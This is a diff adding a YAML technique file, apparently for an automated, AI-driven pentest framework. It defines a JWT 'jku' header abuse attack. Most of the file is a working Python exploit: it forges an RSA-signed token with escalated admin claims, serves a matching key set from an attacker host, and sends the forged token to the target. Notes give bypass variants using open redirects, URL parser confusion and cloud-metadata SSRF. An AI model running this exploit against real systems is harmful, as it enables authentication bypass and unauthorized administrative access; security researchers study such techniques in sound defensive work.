@@ -1,0 +1,93 @@
+name: jwt_jku_abuse
+category: web
+description: Redirect JWT key verification to attacker-controlled JWKS endpoint via jku header
+preconditions:
+- auth_endpoint_known
+- jwt_token_found
+parameters:
+  target_url: from_engagement.target_url
+  token: from_finding.jwt_token
+  attacker_server: from_engagement.attacker_ip
+command_template: >
+  python3 << 'PYEOF'
+  import json, base64, os, sys, http.server, threading, time
+  try:
+      from cryptography.hazmat.primitives.asymmetric import rsa, padding
+      from cryptography.hazmat.primitives import hashes
+      from cryptography.hazmat.backends import default_backend
+  except ImportError:
+      print('pip install cryptography required'); sys.exit(1)
+
+  token = 'TOKEN_PLACEHOLDER'
+  target = 'TARGET_PLACEHOLDER'
+  attacker = 'ATTACKER_PLACEHOLDER'
+
+  def b64d(s):
+      s += '=='*((4-len(s)%4)%4)
+      return base64.urlsafe_b64decode(s)
+  def b64e(b):
+      if isinstance(b, str): b = b.encode()
+      return base64.urlsafe_b64encode(b).rstrip(b'=').decode()
+  def int_to_b64(n):
+      return b64e(n.to_bytes((n.bit_length()+7)//8,'big'))
+
+  parts = token.split('.')
+  header = json.loads(b64d(parts[0]))
+  payload = json.loads(b64d(parts[1]))
+  print(f'Original: alg={header.get(\"alg\")} jku={header.get(\"jku\",\"none\")}')
+
+  private_key = rsa.generate_private_key(65537, 2048, default_backend())
+  pub = private_key.public_key().public_numbers()
+  jwks_content = json.dumps({'keys': [{'kty':'RSA','use':'sig','alg':'RS256',
+      'n': int_to_b64(pub.n), 'e': int_to_b64(pub.e)}]})
+
+  # Serve JWKS on port 8888
+  class JWKSHandler(http.server.BaseHTTPRequestHandler):
+      def do_GET(self):
+          self.send_response(200)
+          self.send_header('Content-Type','application/json')
+          self.end_headers()
+          self.wfile.write(jwks_content.encode())
+      def log_message(self,*args): pass
+
+  srv = http.server.HTTPServer(('0.0.0.0', 8888), JWKSHandler)
+  t = threading.Thread(target=srv.serve_forever, daemon=True)
+  t.start()
+  print(f'Serving JWKS at http://{attacker}:8888/.well-known/jwks.json')
+
+  new_header = {'alg':'RS256','jku': f'http://{attacker}:8888/.well-known/jwks.json'}
+  payload['role']='admin'; payload['admin']=True
+  hdr_b64 = b64e(json.dumps(new_header, separators=(',',':')))
+  pay_b64 = b64e(json.dumps(payload, separators=(',',':')))
+  msg = f'{hdr_b64}.{pay_b64}'.encode()
+  sig = private_key.sign(msg, padding.PKCS1v15(), hashes.SHA256())
+  forged = f'{hdr_b64}.{pay_b64}.{b64e(sig)}'
+  print(f'FORGED_JKU_TOKEN: {forged[:80]}...')
+
+  import urllib.request
+  try:
+      req = urllib.request.Request(target, headers={'Authorization': f'Bearer {forged}'})
+      with urllib.request.urlopen(req, timeout=10) as r:
+          print(f'Response {r.status}: {r.read().decode()[:300]}')
+  except urllib.error.HTTPError as e:
+      print(f'Response {e.code}: {e.read().decode()[:200]}')
+  time.sleep(2)
+  srv.shutdown()
+  PYEOF
+parser: web_response_parser
+expected_effects:
+- jwt_forged
+- auth_bypass_achieved
+falsifier:
+  pattern: 401|403|jku not allowed|domain not whitelisted|connection refused
+  timeout: 45
+model_tier: sonnet
+mechanism: >
+  jku (JWK Set URL) header: if server fetches the key from the URL in the JWT header,
+  point it to an attacker-controlled server. Server resolves the URL, retrieves the
+  attacker's JWKS, and verifies the signature against the attacker's key — which matches.
+  Bypass variations: open redirect on the origin domain, URL parser confusion
+  (https://trusted.com@attacker.com/jwks), SSRF through cloud metadata to jku SSRF.
+hacktricks_ref: pentesting-web/hacking-jwt-json-web-tokens.md
+destructive: false
+opsec: medium
